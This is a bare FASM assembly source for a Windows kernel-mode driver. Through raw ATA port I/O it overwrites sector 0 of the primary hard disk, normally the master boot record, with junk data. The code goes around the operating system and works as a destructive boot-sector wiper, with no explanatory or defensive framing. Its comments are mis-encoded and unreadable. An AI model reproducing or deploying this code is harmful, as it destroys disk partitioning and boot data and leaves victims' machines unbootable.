include '%fasminc%\win32a.inc'
format PE GUI
entry DriverEntry


BASE		      = 0x1F0
DATA_REG	      = BASE + 0
FEATURES_REG	      = BASE + 0x1
ERROR_REG	      = BASE + 0x1
SECCOUNT_REG	      = BASE + 0x2
SECNUM_REG	      = BASE + 0x3
CHIGH_REG	      = BASE + 0x4
CLOW_REG	      = BASE + 0x5
DEVICEHEAD_REG	      = BASE + 0x6
COMMAND_REG	      = BASE + 0x7
STATUS_REG	      = BASE + 0x7
DEVICECTRL_REG	      = 0x3F6
ALTSTATUS_REG	      = 0x3F6

ATA_READSECTOR	      = 0x20
ATA_WRITESECTOR       = 0x31

STATUS_ERR	      = 0x1
STATUS_DRQ	      = 0x8
STATUS_DRDY	      = 0x40
STATUS_BSY	      = 0x80

DEVICEHEAD_DEV	      = 0x10



;___________________________________________________________________________________________
section '.code' code readable writeable executable

  proc DriverEntry	  pDriverObject,pusRegistryPath


    mov 	dx, DEVICECTRL_REG	;|
    mov 	al, 0x2 		;| - ������ ����������
    out 	dx, al			;|

    mov 	dx, STATUS_REG		;|
  @@:					;|
    in		al, dx			;|
    test	al, STATUS_BSY		;| - �������� BSY=0 � DRQ=0
    jnz 	@b			;|
    test	al, STATUS_DRQ		;|
    jnz 	@b			;|

    mov 	dx, DEVICEHEAD_REG	;|
    in		al, dx			;| - ����� Device0
    and 	al, not DEVICEHEAD_DEV	;|
    out 	dx, al			;|

    mov 	dx, STATUS_REG		;|
  @@:					;|
    in		al, dx			;|
    test	al, STATUS_BSY		;| - �������� BSY=0 � DRQ=0
    jnz 	@b			;|
    test	al, STATUS_DRQ		;|
    jnz 	@b			;|

    mov 	dx, SECCOUNT_REG	;|
    mov 	al, 1			;| - ���������� ��������
    out 	dx, al			;|

    mov 	dx, SECNUM_REG		;|
    mov 	al, 0			;| - LBA [0..7]
    out 	dx, al			;|

    mov 	dx, CLOW_REG		;|
    xor 	al, al			;| - LBA [8..15]
    out 	dx, al			;|

    mov 	dx, CHIGH_REG		;|
    xor 	al, al			;| - LBA [17..23]
    out 	dx, al			;|

    mov 	dx, DEVICEHEAD_REG	;|
    mov 	al, 0x40		;|
    out 	dx, al			;|

    mov 	dx, STATUS_REG		;|
  @@:					;|
    in		al, dx			;|
    test	al, STATUS_BSY		;| - �������� BSY=0 � DRQ=0
    jnz 	@b			;|
    test	al, STATUS_DRQ		;|
    jnz 	@b			;|

    mov 	dx, COMMAND_REG 	;|
    mov 	al, ATA_WRITESECTOR	;|
    out 	dx, al			;|

    mov 	dx, ALTSTATUS_REG	;|
    in		al, dx			;|

    mov 	dx, STATUS_REG		;|
  @@:					;|
    in		al, dx			;|
    test	al, STATUS_BSY		;| - �������� BSY=0 � DRQ=1
    jnz 	@b			;|
    test	al, STATUS_DRQ		;|
    jz		@b			;|

    mov 	ecx, 256
  @@:
    mov 	dx, DATA_REG		;| - ������
    out 	dx, ax			;|
    loop	@b

    mov 	dx, STATUS_REG		;|
    in		al, dx			;|

    xor 	eax,eax
    not 	eax
    ret
  endp
;___________________________________________________________________________________________